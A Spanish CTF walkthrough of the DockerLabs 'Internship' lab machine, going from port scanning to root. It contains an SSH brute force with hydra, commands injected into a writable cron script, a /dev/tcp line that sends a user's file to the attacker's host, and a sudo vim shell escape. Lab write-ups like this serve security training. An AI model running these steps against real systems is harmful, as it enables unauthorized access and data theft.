#MAQUINA #DOCKERLABS #FACIL 
#STEGHIDE 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Internship** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 09:07 CET
Initiating ARP Ping Scan at 09:07
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 09:07, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:07
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 09:07, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-15 09:07:18 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 09:07 CET
Nmap scan report for realgob.dl (172.17.0.2)
Host is up (0.000027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 35:ff:c4:8b:c4:e1:46:12:43:b9:03:a9:cf:ec:f3:0a (ECDSA)
|_  256 23:ac:95:1e:be:33:9e:ed:14:f0:45:f6:27:51:ca:ba (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: GateKeeper HR | Tu Portal de Recursos Humanos
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.50 seconds




```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 09:08 CET
Nmap scan report for realgob.dl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds



```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.


## HTTP (80)
Al utilizar la web veo que no funciona nada, hace **virtual hosting** (gatekeeperhr.com). Lo metemos en el /etc/hosts para que funcione.
Al revisar la web que hay en el puerto 80 utilizando **gobuster**:

```bash
gobuster dir -u http://gatekeeperhr.com/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x html,php,js,txt,png,jpg,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gatekeeperhr.com/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,png,jpg,bak,html,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 281]
/.php                 (Status: 403) [Size: 281]
/index.html           (Status: 200) [Size: 3971]
/contact.html         (Status: 200) [Size: 3140]
/about.html           (Status: 200) [Size: 3339]
/default              (Status: 301) [Size: 322] [--> http://gatekeeperhr.com/default/]
/spam                 (Status: 301) [Size: 319] [--> http://gatekeeperhr.com/spam/]
/css                  (Status: 301) [Size: 318] [--> http://gatekeeperhr.com/css/]
/includes             (Status: 301) [Size: 323] [--> http://gatekeeperhr.com/includes/]
/js                   (Status: 301) [Size: 317] [--> http://gatekeeperhr.com/js/]
/lab                  (Status: 301) [Size: 318] [--> http://gatekeeperhr.com/lab/]
/.php                 (Status: 403) [Size: 281]
/.html                (Status: 403) [Size: 281]
/server-status        (Status: 403) [Size: 281]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 281]
Progress: 10190656 / 10190664 (100.00%)
===============================================================
Finished
===============================================================

```

Al meternos en **spam**, vemos que todo es negro, pero si hacemos Ctrl + U:

```
    <!-- Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3' -->
```

Parece estar rotado el comentario:

```
La contraseña de uno de los pasantes es 'purpl3'
```


# EXPLOTACION

Usamos **hydra** para intentar sacar la contraseña:

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p purpl3 ssh://172.17.0.2 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-15 09:31:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 8295455 login tries (l:8295455/p:1), ~129617 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 512.00 tries/min, 512 tries in 00:01h, 8294984 to do in 270:02h, 23 active
[22][ssh] host: 172.17.0.2   login: pedro   password: purpl3

```

**usuario : pedro**
**contraseña: purpl3**

YA ESTAMOS COMO PEDRO.
# ESCALADA PRIVILEGIOS

Vemos con `ps -ef` que valentina ejecuta un script todo el rato:

   ```bash

pedro@fe4f3a8ed689:/opt$ ps -ef | grep "valenti"
valenti+    3650    3645  0 08:41 ?        00:00:00 /bin/sh -c sleep 45; /opt/log_cleaner.sh
valenti+    3651    3647  0 08:41 ?        00:00:00 /bin/sh -c sleep 15; /opt/log_cleaner.sh
valenti+    3652    3646  0 08:41 ?        00:00:00 /bin/sh -c sleep 30; /opt/log_cleaner.sh
valenti+    3654    3651  0 08:41 ?        00:00:00 sleep 15
valenti+    3655    3650  0 08:41 ?        00:00:00 sleep 45
valenti+    3656    3652  0 08:41 ?        00:00:00 sleep 30
pedro       3663    3274  0 08:41 pts/0    00:00:00 grep valenti

```

Nos damos permisos (metemos los comando en el sh):

```bash
#!/bin/bash

chmod 777 /home/valentina
chmod 777 /home/valentina/fl4g.txt
chmod 777 /home/valentina/profile_picture.jpeg

```

Vemos a ver que tiene la foto :

```bash
#la enviamos
cat /home/valentina/profile_picture.jpeg > /dev/tcp/172.17.0.1/443
nc -nvlp 443 > foto.jpg
# al no meter passphrase nos da la contra de valentina -> mag1ck
steghide extract -sf foto.jpg 
```

YA ESTAMOS COMO VALENTINA.

Vemos si el usuario tiene permisos SUDO:
   ```bash
   
valentina@fe4f3a8ed689:~$ sudo -l
[sudo] password for valentina: 
Matching Defaults entries for valentina on fe4f3a8ed689:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty, listpw=always

User valentina may run the following commands on fe4f3a8ed689:
    (ALL : ALL) PASSWD: ALL, NOPASSWD: /usr/bin/vim

```

Vemos **vim** con permisos SUDO :
   ```bash
   
valentina@fe4f3a8ed689:~$ sudo vim -c ':!/bin/sh'

# whoami
root
# 

```

**YA ESTAMOS COMO ROOT.**